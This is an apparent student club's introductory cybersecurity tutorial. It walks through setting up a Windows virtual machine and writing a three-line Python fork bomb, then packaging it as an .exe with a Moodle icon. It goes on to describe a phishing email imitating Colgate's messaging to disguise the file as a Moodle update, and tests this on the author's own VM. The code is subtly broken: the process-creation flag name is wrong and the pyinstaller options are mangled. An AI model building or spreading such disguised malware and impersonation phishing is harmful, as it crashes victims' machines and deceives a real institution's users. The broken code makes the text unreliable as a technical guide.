# ColgateCodersCyberSecurity101

## Part 1: Ethics
- Hacking is one of the most controversial parts of computer science. The concepts you learn here can be used for malicious and <b>illegal</b> activity
- Its pretty intuitive what is moral and what is not, so don't be stupid and you will be fine

## Part 2: Virtual Machines
- Virtual machines are a vital tool in cybersecurity, as they allow you to test and experiment with devices in an isolated environment (sometimes called a sandbox)
- To use a virtual machine, first install Oracle Virtual Box:
    https://www.virtualbox.org/wiki/Downloads
    - Choose the appropriate platform package for your device
    - Follow the instructions on the setup wizard and install
- Next, you need a Windows ISO, which is a disc image used to install the Windows Operating system:
    https://www.microsoft.com/en-us/software-download/windows10
    - Click Accept, then "Create instillation media...", then Next, then "ISO File", choose the location, and install
- Open VirtualBox and click New. Name the new machine and choose the correct directory and ISO image. Then click Skip Unattended Installation. Choose the specs by modifying the memory and processors you give access to. We will be breaking it, so don't give it too much. I will give it 2 CPUs and 3 Gigabytes of RAM. Create a Virtual Hard disk, 50 gigabytes is fine. Press finish and start it up. (This may take a while and be tedious). Follow the instructions, click "I do not have a product key", choose "Windows 10 Pro", and "Custom Installation", and let it load. Finally, follow the basic Windows setup.
- Normally, computers work with three layers, the physical hardware, the operating system, and the applications. The operating system's job is to allow and control the applications to access the hardware. Virtual Machines in this context use what is called a type 2 hypervisor which sits on top of the host Operating System, from which a guest operating system can be run.

## Part 3: Malware
- Malware is code that can be written, that when executed has malicious purposes. There are many different kinds of malware, but we will be making a simple one called a fork bomb in Python.
- What a fork bomb does is exploit the operating system by overwhelming it with processes. A process is an instance of a program that is running. A computer's CPU supports multi-processing, in which the Operating System distributes the running processes across its cores, switching between processes to give the illusion that they are running at the same time. A fork bomb, however, creates too many processes for the OS to handle, crashing the computer. We will be making the Fork Bomb into a Trojan Horse, combining malware with social engineering
- More advanced malware is much more sophisticated, with worms and viruses that can replicate and spread, often without the user knowing. This leads to Advanced Persistent Threats which are continually running and performing illicit activity.
- To make the fork bomb, we only need 3 lines of code. First, we import the subprocess and sys libraries. The subprocess will make the subprocesses and the sys gives us access to the python interpreter.
        import subprocess, sys
- Next, we do an infinite loop
        while True:
- Now we create the forks:
        subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEWCONSOLE)
    - The subprocess.Popen() method creates the new processes.
    - sys.executable means that the new process will run with python
    - sys.argv[0] means that the new process will start at line 0 of the process currently running
    - creationflags=subprocess.CREATE_NEWCONSOLE will make a new terminal for the process. This is not necessary but it makes it look cooler.
 
## Part 3: .py to .exe
- It's not all that fun and useful to have malware as a Python script because it makes it hard to use, so we package it with pyinstaller.
- First, open a terminal and use pip install pyinstaller to make sure you have the library
- Next, open Powershell in the folder with the malware and type pyinstaller - -onefile Malware.py - -icon Icon.ico. This will convert it to an executable file. It also has the custom icon of Moodle for social engineering.

## Part 4: Social Engineering
- When it comes to cyber security, the biggest strength and weakness of a system will always be people. Social engineering is one of the first attack vectors one learns, and while it may seem trivial and not effective, it remains one of the most effective.
- For example, we can take our .exe, give it a custom icon, and also change the name to make it more conspicuous, thus a trojan horse.
- Next, we can make a realistic email using Colgate's messaging scheme.
- Now, modern technology makes it difficult to send malware, and Gmail won't let you attach the .exe to the file, but through some clever manipulation, it can still be made very believable. Say for example, I sent this to myself.

## Part 5: The Attack
- Now I am going to go back to my virtual machine and see how this attack would play out. If I am a student one day opening my emails, and I see this, I may think that Moodle needs an update and follow the instructions.
- Once again, modern technology makes it very hard to get social engineering to work well, in this simple 3 line of code malware, it tries to warn me when downloading and running it, so you would have to be really stupid to fall for this, but when done effectively, it will crash your computer.

## Conclusion
- In reality, cybersecurity is much more advanced and tricky. Companies have entire SOC's or Security Operation Centers with Red Teams and Blue Teams to secure systems. We may talk more about Advanced Persistent Threats, Blue Teaming, Network Security, and Kill Chains in the future.
